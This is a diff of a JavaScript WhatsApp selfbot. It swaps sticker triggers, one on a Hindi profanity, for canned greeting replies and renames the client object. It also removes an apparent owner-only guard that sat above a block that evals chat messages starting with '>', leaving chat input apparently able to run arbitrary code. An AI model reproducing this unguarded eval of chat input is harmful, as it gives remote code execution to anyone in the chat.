-if (budy.includes(`goldigger`)) {
-const Peli = fs.readFileSync('./voicesticker/golddigger.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Goldigger`)) {
-const Peli = fs.readFileSync('./voicesticker/golddigger.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`wahi`)) {
-const Peli = fs.readFileSync('./voicesticker/wahi.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Wahi`)) {
-const Peli = fs.readFileSync('./voicesticker/wahi.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`game`)) {
-const Peli = fs.readFileSync('./voicesticker/game.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Game`)) {
-const Peli = fs.readFileSync('./voicesticker/game.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Bhosdike`)) {
-const Peli = fs.readFileSync('./voicesticker/bhosdike.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`bhosdike`)) {
-const Peli = fs.readFileSync('./voicesticker/bhosdike.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Bonk`)) {
-const Peli = fs.readFileSync('./voicesticker/bonk.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`bonk`)) {
-const Peli = fs.readFileSync('./voicesticker/bonk.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Emotional`)) {
-const Peli = fs.readFileSync('./voicesticker/emotional.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`emotional`)) {
-const Peli = fs.readFileSync('./voicesticker/emotional.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-
-
-     if (!mek.key.fromMe) return;
+      if (budy.includes(`Thank you`)) {
+                  reply(`u r welcome mere dost😽😽 ${pushname}`)
+                  }
+                  if (budy.includes(`thank you`)) {
+                  reply(`you are welcome😊😊 ${pushname}`)
+                  }
+                  if (budy.includes(`koi hai?`)) {
+                  reply(`ha mai hun na😹😹`)
+                  }
+                  if (budy.includes(`hello`)) {
+                  reply(`hmm dost, kaise ho🙃 ${pushname}`)
+                  }
+                  if (budy.includes(`thnx`)) {
+                  reply(`you are welcome💜${pushname}`)
+                  }
+                  if (budy.includes(`Thnx`)) {
+                  reply(`you are welcome😽💜 ${pushname}`)
+                  }
+                  if (budy.includes(`Thanks`)) {
+                  reply(`welcome😽😽 ${pushname}`)
+                  }
+                  if (budy.includes(`thanks`)) {
+                  reply(`no problem😽😽 ${pushname}`)
+                  }
+                  if (budy.includes(`Morning`)) {
+                  reply(`good morng ${pushname}', have a nice day 😁😘`)
+                  }
+                  if (budy.includes(`night`)) {
+                  reply(`gunnait 😽😽${pushname}', sweetdreams💜💜`)
+                  }
+		          if (budy.includes(`Bye`)) {
+                  reply(`byy my frnd take care 💜😽`)
+                  }
+		          if (budy.includes(`bye `)) {
+                  reply(`byy my frnd, take care 😽😽`)
+                  }
+		          if (budy.includes(`koi hai?`)) {
+                  reply(`ha mai hun na😹😹`)
+                  }
+		          if (budy.includes(`Hello`)) {
+                  reply(`Annyeonghaseo🌿🖐️ ${pushname}`)
+                  }
+                  if (budy.includes(`@916909137213`)) {
+                  reply(`sorry dost, shayad xeon busy hai ya so raha hoga🤔`)
+                  }
+                  if (budy.includes(`Hi`)) {
+                  reply(`ha dost,🙃 how are you?`)
+                  }
+                  if (budy.includes(`Afternoon`)) {
+                  reply(`gud afternun ${pushname}, 😚 how is the day goin?`)
+                  }
+		          if (budy.includes(`Wow`)) {
+                  reply(`😍😍`)
+                  }
+                  if (budy.includes(`evening`)) {
+                  reply(`good evenin' ${pushname}, how was ur day?🙃`)
+                  }
+                  if (budy.includes(`wow`)) {
+                  reply(`😍😍`)
+                  }
+                  if (budy.includes(`morning`)) {
+                  reply(`good morng ${pushname}', have a nice day 😁😘`)
+                  }
+                  if (budy.includes(`Night`)) {
+                  reply(`gunnait 😽😽${pushname}', sweetdreams💜💜`)
+                  }
+                  if (budy.includes(`Lol`)) {
+                  reply(`😹😹👈`)
+                  }
+                  
         if (_chats.startsWith(">")) {
           try {
-            return itsmevall.sendMessage(
+            return client.sendMessage(
               from,
               JSON.stringify(eval(budy.slice(2)), null, "\t"),
               text,
@@ -5265,22 +3848,21 @@ itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
             reply(e);
           }
         }
-    }
+       }
 
     if (isGroup && budy != undefined) {
     } else {
       console.log(
-        color("[SELFBOT]", "red"),
-        "Self Bot By Xeon",
+        color("[TEXT]", "red"),
+        "SELF-MODE",
         color(sender.split("@")[0])
       );
     }
-   } catch (e) {
-    e = String(e);// fixed fromMe by xeon
-    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
-      console.log("Message : %s", color(e, "yellow"));
+  } catch (e) {
+    e = String(e);
+    if (!e.includes("c.isZero") && !e.includes("jid")) {
+      console.log("Message : %s", color(e, "green"));
     }
     // console.log(e)
   }
 };
-// Thats all from me Thank you 🙂
